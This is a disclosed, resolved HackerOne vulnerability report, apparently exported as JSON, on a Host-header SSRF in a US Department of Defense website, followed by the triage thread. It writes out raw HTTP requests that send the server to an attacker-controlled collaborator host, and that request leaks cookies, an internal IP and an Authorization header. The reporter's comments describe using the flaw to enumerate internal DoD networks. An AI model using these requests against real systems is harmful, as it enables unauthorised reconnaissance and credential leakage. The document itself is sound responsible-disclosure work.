{"id":310036,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTAwMzY=","url":"https://hackerone.com/reports/310036","title":"SSRF vulnerability on ██████████ leaks internal IP and various sensitive information","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-01-28T20:39:38.355Z","submitted_at":"2018-01-28T20:39:38.355Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"alyssa_herrera","url":"/alyssa_herrera","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-02T19:04:17.885Z","bug_reporter_agreed_on_going_public_at":"2019-09-12T05:17:56.530Z","team_member_agreed_on_going_public_at":"2019-12-02T19:04:17.725Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nA server side request forgery vulnerability appears to leak an internal IP address and tries to connect to an attacker controlled host.\n**Description:**\nIn an normal request on this web page \n```GET /HTTP/1.1\nHost: www.████████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: mt=rid=6130; ASPSESSIONIDQABQSQCS=GNPLOPOCDIGPIKHGFMDDBLBG; googtrans=/en/zh-TW\nConnection: close\nUpgrade-Insecure-Requests: 1\n``` It will connect to the website as expected but if we use a @ on the host header like this \n```\nGET / HTTP/1.1\nHost: www.█████████:80@██████████.burpcollaborator.net\nPragma: no-cache\nCache-Control: no-cache, no-transform\nConnection: close\n```\nIt'll attempt to connect to our website and leak various information. \nOn our  server we would see this, \n```\nGET / HTTP/1.1\nHost: ████████.burpcollaborator.net\nPragma: no-cache\nCache-Control: no-cache, no-transform\nCookie: mt=rid=6130; ASPSESSIONIDQABQSQCS=GNPLOPOCDIGPIKHGFMDDBLBG\nX--------------: 1.1.1.1      \nAccept-Encoding: gzip, deflate, identity\nConnection: Keep-Alive\nAuthorization: Basic ████████\nX-BlueCoat-Via: 913daace1d652c00\n```\nAdditionally we will see a DNS look up from this IP, 214.72.0.2 Which I confirmed to be DOD owned\n## Impact\nMedium\n## Step-by-step Reproduction Instructions\nWe can reproduce this simply using www.████:80@yourhostname.com for the host header and we'll the see the results. As seen below \n```\nGET / HTTP/1.1\nHost: www.████:80@yourwebsite.com\nPragma: no-cache\nCache-Control: no-cache, no-transform\nConnection: close\n```\nIf you have burp suite pro, you can do this easily with burp collaborator \n## Product, Version, and Configuration (If applicable)\nN/a\n## Suggested Mitigation/Remediation Actions\nRefuse  attempts to connect to other hosts.\n\n## Impact\n\nThis will allow attackers to gain access to an internal IP of a DOD website along with other sensitive information that may be leaked with the request","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":25,"voters":["moloshy","sameerphad72","alyssa_herrera","realtess","powerjacobb1","brodie_codie","dastan_9408","domssilva","klau5","b69fb2ebda43240ece9dbeb","and 15 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2325901,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2018-01-28T20:39:38.526Z","updated_at":"2018-01-28T20:39:38.526Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2356056,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Greetings @alyssa_herrera,\n\nTo validate the reported vulnerability, we require additional information.\n\nCan you please answer the following questions?\n\nWhich information do you deem sensitive? Also please provide screenshot(s) or screen recording to illustrate the issue so we can clearly understand the issue you are reporting.\n\nI will continue processing your report on receipt of your response.  You will receive another status update upon completion of this review.  If I have any other questions in the interim, I will be back in touch.  \n\nIf we do not receive a response within two weeks, we will send you a second request for this information.  If we do not receive a response from you within two weeks of the second notice, we will have to close this report without action. \n\nIf you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards, ","automated_response":false,"created_at":"2018-02-06T17:01:44.276Z","updated_at":"2018-02-06T17:02:27.362Z","actor":{"username":"aboateng","cleared":false,"url":"/aboateng","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2356429,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"This is quite similar to #277450 and with the same issue. \n\n\nWhois for both ip's \n Source:  whois.arin.net\nIP Address:  ██████\nName:  ███\nHandle:  ███████\nRegistration Date:  █████\nRange:  ████\nOrg:  ████████\nOrg Handle:  ███\nAddress:  ██████\nCity: ████████\nState/Province:  ████\nPostal Code: █████\nCountry:  United States\nName Servers: \n\n\nSource:  whois.arin.net\nIP Address:  █████\nName:  ███\nHandle:  ███\nRegistration Date:  █████\nRange:  ████\nOrg:  Headquarters, █████████\nOrg Handle:  ████████\nAddress:  ████\nCity:  ███\nState/Province:  ███████\nPostal Code:  █████\nCountry:  United States\nName Servers: ","automated_response":false,"created_at":"2018-02-06T18:59:21.835Z","updated_at":"2019-10-11T13:35:36.524Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2356548,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-02-06T19:34:07.528Z","updated_at":"2018-02-06T19:34:07.528Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":115880},"actor":{"username":"aboateng","cleared":false,"url":"/aboateng","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2356549,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2018-02-06T19:34:10.945Z","updated_at":"2018-02-06T19:34:10.945Z","actor":{"username":"aboateng","cleared":false,"url":"/aboateng","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2497885,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, i'd like to give a bit of an update on this exploit. I figured out we can perform blind SSRF using this exploit.\nIf we use an https enabled website, We can trigger an SSL error which leads me to believe this website has the necessary capability to connect to other military websites either through the intranet or through clearnet. If we can query known military DNS it'll time out confirming it exists. I can do this with any DoD IP thus an attacker can enumerate the DoD internal infrastructure. I hope this is enough to bump the severity up a bit. Additionally We can use an IP I was able to pull from another report of mine to prove this theory,\nIf we  use www.██████████:80@████████ \n\nWe can use this to tunnel into internal networks and access intranet servers which I assume is accessible to NIPERNET if my understanding of the DoD intranet is correct","automated_response":false,"created_at":"2018-03-16T05:32:29.486Z","updated_at":"2019-10-11T13:29:10.957Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2498850,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-03-16T11:37:06.977Z","updated_at":"2018-03-16T11:37:06.977Z","additional_data":{"old_severity":"Low","new_severity":"Medium","old_severity_id":115880,"new_severity_id":129462},"actor":{"username":"ag3nt-dc3","cleared":false,"url":"/ag3nt-dc3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/L4VwCxQhxChvp7urb5HUH4ML/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3526799,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2018-10-24T15:04:17.009Z","updated_at":"2018-10-24T15:04:17.009Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"alyssa_herrera","url":"/alyssa_herrera"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5787478,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-09-12T05:17:56.547Z","updated_at":"2019-09-12T05:17:56.547Z","first_to_agree":true,"actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6450592,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Approved for disclosure. Thanks for your participation in the DoD Vulnerability Disclosure Program (VDP). Please follow us on Twitter @DC3VDP","automated_response":false,"created_at":"2019-12-02T19:04:17.747Z","updated_at":"2019-12-02T19:04:17.747Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6450593,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-12-02T19:04:17.903Z","updated_at":"2019-12-02T19:04:17.903Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}